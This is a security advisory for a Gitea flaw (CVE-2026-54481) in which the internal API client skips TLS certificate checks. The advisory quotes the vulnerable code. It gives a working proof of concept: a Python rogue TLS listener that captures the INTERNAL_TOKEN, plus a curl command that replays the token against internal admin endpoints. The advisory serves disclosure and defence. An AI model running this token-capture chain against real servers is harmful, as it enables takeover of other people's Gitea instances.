# [H] Gitea: Internal API HTTP client hardcodes InsecureSkipVerify:true with no config override

## Summary
Severity: High
Advisory: GHSA-94v3-77j7-vm48
CVE: CVE-2026-54481
CWE: CWE-295
Ecosystem: Go
CVSS: CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-94v3-77j7-vm48
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
Summary

Gitea's internal API HTTP client (modules/private/internal.go) hardcodes
TLSClientConfig.InsecureSkipVerify = true with no configuration override. It is the only
outbound TLS client in the codebase that cannot be made to verify its peer's certificate —
webhook, migrations, MinIO, LDAP, SMTP, Redis and incoming-mail all expose a secure-by-default
SkipVerify toggle, this one does not.

When an operator configures internal communication over HTTPS to a non-loopback target
(LOCAL_ROOT_URL=https://<host>/ in a split-host / multi-pod topology), the gitea serv / gitea hook
subprocess that calls the internal API will accept ANY TLS certificate. An attacker with on-path
position on that internal segment can MITM the connection and capture the static high-privilege
INTERNAL_TOKEN, which is the sole authentication for every /api/internal/* endpoint (server
shutdown/restart, SSH key authorization, git command execution, repo hooks, mail send, runner-token
generation).

Severity is deployment-dependent: High for split-host HTTPS deployments; Low/Informational for the
default single-host / unix-socket / HTTP-loopback deployment, where the call is loopback and not
interceptable without local access (which already exposes the token directly). This report is
rated for the affected configuration and the underlying defense-in-depth defect.
Details

Affected component: modules/private/internal.go

The internal API transport hardcodes certificate-verification bypass:

    var internalAPITransport = sync.OnceValue(func() http.RoundTripper {
        return &http.Transport{
            DialContext: dialContextInternalAPI,
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: true,            // hardcoded, no config gate
                ServerName:         setting.Domain,  // SNI only; NOT used for validation while skip=true
            },
        }
    })

Because InsecureSkipVerify is true, ServerName is used only for SNI and any certificate (any CN,
self-signed) is accepted; there is no accidental safety net.

Verified exploit chain (read against main @ aab9737651, 2026-06-13):

1. TLS path is reached whenever LOCAL_ROOT_URL scheme is https — http.Transport applies
   TLSClientConfig only for https requests. (modules/private/internal.go:56-64)

2. The dialer connects to the real host from the URL, with no loopback pinning:
   dialContextInternalAPI -> d.DialContext(ctx, network, address), where address is the host:port
   from LOCAL_ROOT_URL. (modules/private/internal.go:37-54)

3. The client runs as a SEPARATE process, so a real socket is used and can cross hosts:
   - Built-in and external SSH both exec "gitea serv key-N" (modules/ssh/ssh.go:109,123;
     models/asymkey/ssh_key_authorized_keys.go via authorized_keys command=).
   - Git hooks exec "gitea hook ...".
   These subprocesses call back to LOCAL_ROOT_URL. Same host => loopback; split host => network hop.

4. INTERNAL_TOKEN is sent on every internal request as a static bearer header:
   Header("X-Gitea-Internal-Auth", "Bearer "+setting.InternalToken)  (modules/private/internal.go:80)

5. A captured token is accepted and is the SOLE gate for all internal routes:
   authInternal() does subtle.ConstantTimeCompare(header, setting.InternalToken) and nothing else.
   (routers/private/internal.go:24-42). The server code even comments:
   "// TODO: use something like JWT or HMAC to avoid passing the token in the clear"
   (routers/private/internal.go:32)

6. Amplifier: internal routes are mounted on the main public listener, not a loopback-only socket:
   r.Mount("/api/internal", private.Routes())  (routers/init.go:185)
   so a stolen token is replayable by anyone who can reach the Gitea HTTP port.

Inconsistency / root cause: every other outbound TLS client is configurable and secure-by-default
(services/webhook/deliver.go Webhook.SkipTLSVerify; services/migrations/http_client.go
Migrations.SkipTLSVerify; modules/storage/minio.go MINIO_INSECURE_SKIP_VERIFY; LDAP/SMTP SkipVerify;
incoming-mail SkipTLSVerify). The internal API client alone is hardcoded insecure with no opt-out.
The InsecureSkipVerify line has been present since 2017 (#1471), so all releases are affected.
PoC

Goal: capture the live INTERNAL_TOKEN from a real Gitea subprocess call and replay it.

Note: a self-contained TLS test (e.g. Python ssl.CERT_NONE accepting a self-signed cert) only
restates the flag's definition and does NOT involve Gitea. The steps below exercise the real path.

1. Configure Gitea so the internal client uses HTTPS to an interceptable target:
     [server]
     PROTOCOL       = https
     LOCAL_ROOT_URL = https://127.0.0.1:8443/

2. Run a rogue TLS listener on 127.0.0.1:8443 presenting ANY self-signed certificate, logging the
   X-Gitea-Internal-Auth request header. Minimal handler:

     # python3 rogue.py
     import http.server, ssl, subprocess
     subprocess.run(["openssl","req","-x509","-newkey","rsa:2048","-keyout","k.pem","-out","c.pem",
                     "-days","1","-nodes","-subj","/CN=127.0.0.1"], check=True)
     class H(http.server.BaseHTTPRequestHandler):
         def handle_one(self):
             pass
         def do_GET(self):  self._h()
         def do_POST(self): self._h()
         def _h(self):
             a = self.headers.get("X-Gitea-Internal-Auth","")
             if "Bearer" in a: print("[!] CAPTURED TOKEN:", a.replace("Bearer ",""))
             self.send_response(200); self.end_headers(); self.wfile.write(b'{"err":"","user_msg":""}')
         def log_message(self,*a): pass
     s = http.server.HTTPServer(("127.0.0.1",8443), H)
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain("c.pem","k.pem")
     s.socket = ctx.wrap_socket(s.socket, server_side=True)
     s.serve_forever()

3. Trigger a real internal call through a subprocess path: perform an SSH git operation against the
   instance (e.g. `git clone ssh://git@<host>:<port>/owner/repo.git`). sshd/built-in SSH execs
   `gitea serv`, which issues the internal API request to LOCAL_ROOT_URL and presents the token to
   the rogue listener.

4. Observe at the listener:
     [!] CAPTURED TOKEN: <INTERNAL_TOKEN>

5. Confirm the token is privileged by replaying it directly against the Gitea HTTP port:
     curl -k https://<gitea-host>:<port>/api/internal/manager/processes \
          -H "X-Gitea-Internal-Auth: Bearer <INTERNAL_TOKEN>"
   A 200 with process data confirms full internal-API access (the same token also reaches
   /api/internal/manager/shutdown, /ssh/authorized_keys, /serv/command/..., etc.).

In a production split-host deployment, step 2 is replaced by on-path interception (ARP spoofing on
the shared segment, a malicious sidecar/pod, or DNS/route manipulation) rather than a localhost
listener; the client behaviour (trusting the rogue cert and sending the token) is identical.
Impact

Type: CWE-295 Improper Certificate Validation -> man-in-the-middle -> theft of the static
high-privilege INTERNAL_TOKEN -> full internal-API compromise.

Who is impacted: operators who run internal communication over HTTPS to a non-loopback target
(split-host / multi-pod / separate SSH or hook host with LOCAL_ROOT_URL=https://<remote>/) on a
network segment where an attacker can obtain on-path position. With the token, an attacker can:
shut down / restart the server (DoS), authorize SSH keys, execute git serv commands, control
pre/post/proc-receive hooks, change default branches, restore repos, send mail as Gitea, and
generate Actions runner tokens.

NOT practically impacted: default single-host, unix-socket (http+unix), or HTTP-loopback
deployments, where the internal call is loopback and not interceptable without local code execution
(which already exposes INTERNAL_TOKEN from app.ini, making MITM unnecessary).

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-94v3-77j7-vm48
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
